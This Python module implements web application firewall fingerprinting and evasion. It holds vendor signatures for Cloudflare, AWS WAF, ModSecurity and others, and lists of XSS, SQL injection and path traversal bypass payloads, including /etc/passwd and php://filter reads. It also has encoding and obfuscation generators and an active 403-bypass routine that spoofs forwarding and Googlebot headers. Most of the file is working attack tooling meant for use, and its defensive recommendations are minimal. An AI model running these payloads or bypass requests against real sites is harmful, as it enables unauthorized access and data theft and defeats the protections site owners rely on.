#!/usr/bin/env python3
"""
WAF Bypass Module - Advanced WAF detection and bypass techniques with AssetManager
"""

import logging
import re
import base64
import urllib.parse
from typing import Dict, List

logger = logging.getLogger("WAFBypass")

class WAFBypass:
    """Advanced WAF detection and bypass using AssetManager logging"""
    
    def __init__(self, asset_manager, config: Dict):
        self.asset_manager = asset_manager  # Use YOUR AssetManager
        self.config = config
        
        # WAF detection signatures
        self.waf_signatures = self._load_waf_signatures()
        
        # Bypass techniques database
        self.bypass_techniques = self._load_bypass_techniques()
        
        logger.info("🛡️ WAFBypass initialized with AssetManager integration")
    
    async def initialize(self):
        """Initialize WAF bypass module"""
        try:
            # Log initialization using AssetManager
            self.asset_manager.log_activity(
                'WAF_BYPASS_INIT',
                f'WAFBypass initialized - {len(self.waf_signatures)} WAF types supported'
            )
            
            logger.info("✅ WAFBypass initialization complete")
            
        except Exception as e:
            logger.error(f"WAFBypass initialization failed: {e}")
    
    def _load_waf_signatures(self) -> Dict:
        """Load comprehensive WAF detection signatures"""
        return {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', '__cfruid'],
                'content': ['cloudflare', 'ray id:', 'cf-browser-verification'],
                'cookies': ['__cfduid', '__cf_bm']
            },
            'aws_waf': {
                'headers': ['x-amzn-requestid', 'x-amz-cf-id'],
                'content': ['awswaf', 'aws waf'],
                'cookies': ['AWSALB', 'AWSALBCORS']
            },
            'incapsula': {
                'headers': ['x-iinfo'],
                'content': ['incapsula', '_incap_ses', 'visid_incap'],
                'cookies': ['incap_ses', 'visid_incap']
            },
            'sucuri': {
                'headers': ['x-sucuri-id', 'x-sucuri-cache'],
                'content': ['sucuri', 'access denied - sucuri website firewall'],
                'cookies': []
            },
            'akamai': {
                'headers': ['akamai-ghost'],
                'content': ['akamai', 'reference #'],
                'cookies': ['ak_bmsc']
            },
            'barracuda': {
                'headers': [],
                'content': ['barracuda', 'barra', 'blocked by barracuda'],
                'cookies': ['barra_counter_session']
            },
            'f5_bigip': {
                'headers': ['x-wa-info'],
                'content': ['f5', 'bigip', 'the requested url was rejected'],
                'cookies': ['bigipserver', 'f5-ltwt', 'f5_cspm']
            },
            'fortinet': {
                'headers': [],
                'content': ['fortigate', 'fortinet', 'fortiwafsid'],
                'cookies': ['FORTIWAFSID']
            },
            'mod_security': {
                'headers': [],
                'content': ['mod_security', 'not acceptable', 'access denied'],
                'cookies': []
            },
            'wordfence': {
                'headers': [],
                'content': ['wordfence', 'your access to this site has been limited'],
                'cookies': ['wfwaf-authcookie']
            }
        }
    
    def _load_bypass_techniques(self) -> Dict:
        """Load WAF bypass techniques for different vulnerability types"""
        return {
            'xss': {
                'cloudflare': [
                    # Case variation
                    '<ScRiPt>alert(1)</ScRiPt>',
                    '<SCRIPT>alert(1)</SCRIPT>',
                    # Event handlers
                    '<svg onload=alert(1)>',
                    '<img src=x onerror=alert(1)>',
                    '<details open ontoggle=alert(1)>',
                    # Encoding
                    '&lt;script&gt;alert(1)&lt;/script&gt;',
                    '%3Cscript%3Ealert(1)%3C/script%3E',
                    # Alternative tags
                    '<marquee onstart=alert(1)>',
                    '<select onfocus=alert(1) autofocus>',
                    # Template literals
                    '<script>alert`1`</script>',
                    '<script>eval`alert\u00281\u0029`</script>'
                ],
                'aws_waf': [
                    '<svg><animate onbegin=alert(1)>',
                    '<audio src=x onerror=alert(1)>',
                    '<video poster=x onerror=alert(1)>',
                    '<object data="javascript:alert(1)">',
                    '<embed src="javascript:alert(1)">',
                    '<iframe src="javascript:alert(1)">',
                    '<math><mtext><option><FAKEFAKE></option></mtext></math>',
                    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>'
                ],
                'mod_security': [
                    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
                    '<script>setTimeout("alert(1)",1)</script>',
                    '<script>setInterval("alert(1)",1)</script>',
                    '<script>Function("alert(1)")()</script>',
                    '<script>(function(){alert(1)})()</script>',
                    '<script>eval(atob("YWxlcnQoMSk="))</script>'  # Base64
                ]
            },
            'sqli': {
                'cloudflare': [
                    "' UNION/**/SELECT/**/NULL--",
                    "' UN/**/ION SE/**/LECT NULL--", 
                    "'/**/UNION/**/SELECT/**/NULL--",
                    "' UNION%0ASELECT%0ANULL--",
                    "' UNION%23comment%0ASELECT NULL--",
                    "' /*!UNION*/ /*!SELECT*/ NULL--",
                    "'+UNION+SELECT+NULL--",
                    "'%20UNION%20SELECT%20NULL--"
                ],
                'aws_waf': [
                    "' OR '1'='1'--",
                    "' OR 'x'='x'--",
                    "' OR 1=1#",
                    "' OR 'a'='a'--",
                    "' OR true--",
                    "' || 'a'='a'--",
                    "' AND '1'='1'--",
                    "' %26%26 '1'='1'--"
                ],
                'mod_security': [
                    "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--",
                    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                    "' AND LENGTH(DATABASE())>1--"
                ]
            },
            'lfi': {
                'generic': [
                    # Double encoding
                    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                    # Null byte injection
                    "../../../etc/passwd%00",
                    # Directory traversal variations
                    "....//....//....//etc/passwd",
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                    # Filter/wrapper abuse
                    "php://filter/read=convert.base64-encode/resource=index.php",
                    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
                    "//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                    # ZIP wrapper
                    "zip://archive.zip%23dir/file.txt"
                ]
            }
        }
    
    def detect_waf(self, headers: Dict, content: str) -> str:
        """Detect WAF type from response headers and content"""
        try:
            headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
            content_lower = content.lower()
            
            # Check each WAF signature
            for waf_name, signatures in self.waf_signatures.items():
                detection_score = 0
                
                # Check headers
                for header_sig in signatures['headers']:
                    if any(header_sig in header_name for header_name in headers_lower.keys()):
                        detection_score += 2
                    if any(header_sig in header_value for header_value in headers_lower.values()):
                        detection_score += 1
                
                # Check content
                for content_sig in signatures['content']:
                    if content_sig in content_lower:
                        detection_score += 2
                
                # Check cookies (in Set-Cookie headers)
                set_cookie = headers_lower.get('set-cookie', '')
                for cookie_sig in signatures['cookies']:
                    if cookie_sig in set_cookie:
                        detection_score += 1
                
                # If we have strong evidence, return WAF type
                if detection_score >= 2:
                    logger.info(f"🛡️ WAF detected: {waf_name} (confidence: {detection_score})")
                    
                    # Log WAF detection using AssetManager
                    self.asset_manager.log_activity(
                        'WAF_DETECTED',
                        f'WAF detected: {waf_name} with confidence score {detection_score}'
                    )
                    
                    return waf_name
            
            return "unknown"
            
        except Exception as e:
            logger.debug(f"WAF detection failed: {e}")
            return "unknown"
    
    def generate_bypass_payloads(self, waf_type: str, base_payload: str, vuln_type: str) -> List[str]:
        """Generate WAF-specific bypass payloads"""
        
        bypass_payloads = []
        
        # Get specific bypass techniques for this WAF and vulnerability type
        waf_techniques = self.bypass_techniques.get(vuln_type, {}).get(waf_type, [])
        generic_techniques = self.bypass_techniques.get(vuln_type, {}).get('generic', [])
        
        # Add WAF-specific techniques
        bypass_payloads.extend(waf_techniques[:5])  # Limit to top 5
        
        # Add generic techniques if no specific ones exist
        if not waf_techniques:
            bypass_payloads.extend(generic_techniques[:5])
        
        # Generate encoded variations of the base payload
        bypass_payloads.extend(self._generate_encoded_payloads(base_payload, waf_type))
        
        # Generate obfuscated variations
        bypass_payloads.extend(self._generate_obfuscated_payloads(base_payload, vuln_type))
        
        # Remove duplicates and limit results
        unique_payloads = list(dict.fromkeys(bypass_payloads))  # Preserve order
        
        logger.debug(f"🔄 Generated {len(unique_payloads)} bypass payloads for {waf_type} WAF ({vuln_type})")
        
        return unique_payloads[:10]  # Return top 10 bypass attempts
    
    def _generate_encoded_payloads(self, payload: str, waf_type: str) -> List[str]:
        """Generate various encoding bypass attempts"""
        encoded_payloads = []
        
        try:
            # URL encoding variations
            encoded_payloads.append(urllib.parse.quote(payload))
            encoded_payloads.append(urllib.parse.quote_plus(payload))
            
            # Double URL encoding
            double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
            encoded_payloads.append(double_encoded)
            
            # HTML entity encoding
            html_encoded = ''.join(f'&#{ord(char)};' for char in payload)
            encoded_payloads.append(html_encoded)
            
            # Hex encoding
            hex_encoded = ''.join(f'%{ord(char):02x}' for char in payload)
            encoded_payloads.append(hex_encoded)
            
            # Base64 encoding (for some contexts)
            if 'script' in payload.lower():
                b64_payload = base64.b64encode(payload.encode()).decode()
                encoded_payloads.append(f'eval(atob("{b64_payload}"))')
            
            # Unicode encoding
            unicode_encoded = payload.encode('unicode_escape').decode()
            encoded_payloads.append(unicode_encoded)
            
        except Exception as e:
            logger.debug(f"Encoding generation failed: {e}")
        
        return encoded_payloads
    
    def _generate_obfuscated_payloads(self, payload: str, vuln_type: str) -> List[str]:
        """Generate obfuscated payload variations"""
        obfuscated = []
        
        try:
            if vuln_type == 'xss':
                # Case variation
                obfuscated.append(self._randomize_case(payload))
                
                # Comment insertion
                if '<script>' in payload.lower():
                    obfuscated.append(payload.replace('<script>', '<script/**/>')
                                    .replace('</script>', '</script/**/>')
                    )
                
                # Space variations
                obfuscated.append(payload.replace(' ', '/**/'))
                obfuscated.append(payload.replace(' ', '\t'))
                obfuscated.append(payload.replace(' ', '\n'))
                
            elif vuln_type == 'sqli':
                # Comment variations
                obfuscated.append(payload.replace(' ', '/**/'))
                obfuscated.append(payload.replace(' UNION ', ' UNION/**/'))
                obfuscated.append(payload.replace(' SELECT ', ' SELECT/**/'))
                
                # Case variations
                obfuscated.append(payload.upper())
                obfuscated.append(self._randomize_case(payload))
                
                # Alternative operators
                obfuscated.append(payload.replace('=', ' LIKE '))
                obfuscated.append(payload.replace('OR', '||'))
                obfuscated.append(payload.replace('AND', '&&'))
            
        except Exception as e:
            logger.debug(f"Obfuscation generation failed: {e}")
        
        return obfuscated
    
    def _randomize_case(self, text: str) -> str:
        """Randomize case of alphabetic characters"""
        import random
        result = ""
        for char in text:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result
    
    def analyze_waf_strength(self, waf_type: str, successful_bypasses: List[str]) -> Dict:
        """Analyze WAF strength based on successful bypasses"""
        
        analysis = {
            "waf_type": waf_type,
            "strength": "unknown",
            "bypass_success_rate": 0.0,
            "vulnerable_techniques": [],
            "recommendations": []
        }
        
        if not successful_bypasses:
            analysis["strength"] = "strong"
            analysis["recommendations"].append("WAF appears to be properly configured")
            return analysis
        
        # Calculate bypass success rate
        total_attempts = 10  # Assuming 10 bypass attempts were made
        bypass_count = len(successful_bypasses)
        analysis["bypass_success_rate"] = bypass_count / total_attempts
        
        # Classify WAF strength
        if bypass_count >= 7:
            analysis["strength"] = "weak"
        elif bypass_count >= 4:
            analysis["strength"] = "moderate"  
        else:
            analysis["strength"] = "strong"
        
        # Analyze successful bypass techniques
        for bypass in successful_bypasses:
            if 'encoding' in bypass.lower() or '%' in bypass:
                analysis["vulnerable_techniques"].append("encoding_bypass")
            if '/*' in bypass or '/**/' in bypass:
                analysis["vulnerable_techniques"].append("comment_evasion")
            if bypass.isupper() or bypass.islower():
                analysis["vulnerable_techniques"].append("case_evasion")
            if 'base64' in bypass.lower() or 'atob' in bypass:
                analysis["vulnerable_techniques"].append("base64_evasion")
        
        # Generate recommendations
        if "encoding_bypass" in analysis["vulnerable_techniques"]:
            analysis["recommendations"].append("Implement proper URL decoding validation")
        if "comment_evasion" in analysis["vulnerable_techniques"]:
            analysis["recommendations"].append("Filter SQL/JavaScript comments")
        if "case_evasion" in analysis["vulnerable_techniques"]:
            analysis["recommendations"].append("Implement case-insensitive filtering")
        
        logger.info(f"🛡️ WAF Analysis: {waf_type} - {analysis['strength']} strength ({analysis['bypass_success_rate']:.2f} bypass rate)")
        
        return analysis

    async def attempt_403_bypass(self, url: str, session) -> List[Dict]:
        """
        Attempts to bypass a 403 Forbidden error using various techniques.
        """
        if not url:
            return []

        logger.info(f"🛡️ Starting 403 bypass scan for: {url}")
        successful_bypasses = []
        
        from urllib.parse import urljoin, urlparse

        techniques = {
            "HTTP_METHODS": ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"],
            "HEADERS": {
                "X-Original-URL": "/admin",
                "X-Rewrite-URL": "/admin",
                "X-Custom-IP-Authorization": "127.0.0.1",
                "X-Forwarded-For": "127.0.0.1",
                "X-Forwarded-Host": "localhost",
                "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"
            },
            "PATH_VARIATIONS": [
                "/",
                "/*",
                "/%2e/",
                "/.",
                "//",
                "/./",
                "?",
                "??",
                "#",
            ]
        }

        # 1. Test different HTTP methods
        for method in techniques["HTTP_METHODS"]:
            try:
                async with session.request(method, url, timeout=10, ssl=False) as response:
                    if response.status != 403:
                        result = {
                            "technique": f"HTTP Method: {method}",
                            "successful": True,
                            "final_status_code": response.status,
                            "response_headers": str(dict(response.headers)),
                            "url": url
                        }
                        successful_bypasses.append(result)
                        logger.warning(f"✅ 403 Bypass successful for {url} with method {method} -> {response.status}")
            except Exception as e:
                logger.error(f"Error testing method {method} on {url}: {e}")

        # 2. Test different headers
        for header, value in techniques["HEADERS"].items():
            try:
                headers = {header: value}
                async with session.get(url, headers=headers, timeout=10, ssl=False) as response:
                    if response.status != 403:
                        result = {
                            "technique": f"Header: {header}: {value}",
                            "successful": True,
                            "final_status_code": response.status,
                            "response_headers": str(dict(response.headers)),
                            "url": url
                        }
                        successful_bypasses.append(result)
                        logger.warning(f"✅ 403 Bypass successful for {url} with header {header} -> {response.status}")
            except Exception as e:
                logger.error(f"Error testing header {header} on {url}: {e}")

        # 3. Test path variations
        for path_variation in techniques["PATH_VARIATIONS"]:
            test_url = urljoin(url, urlparse(url).path + path_variation)
            try:
                async with session.get(test_url, timeout=10, ssl=False) as response:
                    if response.status != 403:
                        result = {
                            "technique": f"Path Variation: {path_variation}",
                            "successful": True,
                            "final_status_code": response.status,
                            "response_headers": str(dict(response.headers)),
                            "url": test_url
                        }
                        successful_bypasses.append(result)
                        logger.warning(f"✅ 403 Bypass successful for {test_url} with path variation -> {response.status}")
            except Exception as e:
                logger.error(f"Error testing path variation {path_variation} on {url}: {e}")
        
        logger.info(f"🛡️ 403 bypass scan for {url} completed. Found {len(successful_bypasses)} potential bypasses.")
        return successful_bypasses
